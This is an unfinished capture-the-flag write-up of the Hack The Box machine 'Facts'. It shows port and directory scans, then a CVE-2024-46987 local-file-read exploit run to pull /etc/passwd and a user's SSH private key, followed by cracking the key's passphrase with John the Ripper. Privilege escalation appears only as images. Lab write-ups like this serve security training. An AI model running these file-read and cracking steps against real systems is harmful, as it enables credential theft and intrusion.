---
layout: post
title: "HTB - Facts"
date: 2026-01-02 12:00:00 +0000
locked: true
collection: writeups
tags: [hackthebox, htb, linux, web, s3, minio, lfi, cve-2024-46987, privilege-escalation]
image: "/assets/images/thumbnails/htb/ctf/facts/thumbnail.png"
description: "Hack The Box 'Facts' write-up covering web enumeration, MinIO discovery, exploitation of CVE-2024-46987 for LFI, SSH key extraction, password cracking with John, and privilege escalation via misconfigured sudo permissions."
author: "SoftAndoWetto"
---

Not done yet ;)


# RustScan

```
Facts %  rustscan -a 10.129.4.192 -r 1-65535 -- -sC -sV                                                                 15:45:32
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

Open 10.129.4.192:22
Open 10.129.4.192:80
Open 10.129.4.192:54321

\<SNIP\>

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: facts
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8C83ADFFE48BE12C38E7DBCC2D0524BC
54321/tcp open  http    syn-ack ttl 62 Golang net/http server
| http-methods:
|_  Supported Methods: GET OPTIONS
|_http-title: Did not follow redirect to http://facts.htb:9001
|_http-server-header: MinIO
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1894C4AC358A7F68
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Feb 2026 15:46:37 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1894C4AC358A7F68</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1894C4A85A04EA06
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Feb 2026 15:46:20 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1894C4A85A04EA06</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 16 Feb 2026 15:46:21 GMT
|_    Content-Length: 0
```



![Admin Login Page](/assets/images/thumbnails/htb/ctf/facts/main.png)

![Create New Account](/assets/images/thumbnails/htb/ctf/facts/create_account.png)

# Ferox Buster

~ %  feroxbuster -u http://facts.htb/ \                                                                                 15:46:55
  --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
  --threads 50 \
  -r

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://facts.htb/
 🚩  In-Scope Url          │ facts.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────

\<SNIP\>

200      GET       84l      217w     3896c http://facts.htb/admin/login



![Admin Dahsboard](/assets/images/thumbnails/htb/ctf/facts/admin.png)
![Service and Version](/assets/images/thumbnails/htb/ctf/facts/version.png)




# CVE-2024-46987
```
CVE-2024-46987 %  python CVE-2024-46987.py -u http://facts.htb/ -l A -p B /etc/passwd | grep /bin/bash                   15:58:47
root❌0:0:root:/root:/bin/bash
trivia❌1000:1000:facts.htb:/home/trivia:/bin/bash
william❌1001:1001::/home/william:/bin/bash
CVE-2024-46987 %  python CVE-2024-46987.py -u http://facts.htb/ -l A -p B /home/trivia/.ssh/id_ed25519                   16:00:12
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDwzk+Vns
5HzzMcNmI6bLPrAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMVANpOcT3r5PLXh
3dH7cuPHP8/JYt9Y5l+6Y4fzvKI8AAAAoPeNWi1/04C88aJt5heaIxgcMMV2BBmidxX1wY
x+0iigwXLJSoXAR4/RNVzYfnDCmNxO8QwiURVvXPbJimAodhXpH8kqxHsgZeZ/pBrAHTn6
Tv1Wndrabd0S/9m/XRPoXmbQbIiRP0yDPPe+1EMYn2Xy7WjWA8KcpUVZ8jz1BZHTmgXFaP
Atzk9e3kDi6eUedyrEurIN0TUAOd/Bg1qFZHQ=
-----END OPENSSH PRIVATE KEY-----
```



# John The Ripper
```
CVE-2024-46987 %  john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519_hash.txt                                  16:11:05
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)
1g 0:00:04:49 DONE (2026-02-16 16:16) 0.003448g/s 11.03p/s 11.03c/s 11.03C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![Sudo Permissions](/assets/images/thumbnails/htb/ctf/facts/sudo.png)
![Facter Priv Esc Method](/assets/images/thumbnails/htb/ctf/facts/facter.png)
![Privilege Escalation](/assets/images/thumbnails/htb/ctf/facts/priv_esc.png)
![Sudo Permissions](/assets/images/thumbnails/htb/ctf/facts/sudo.png)
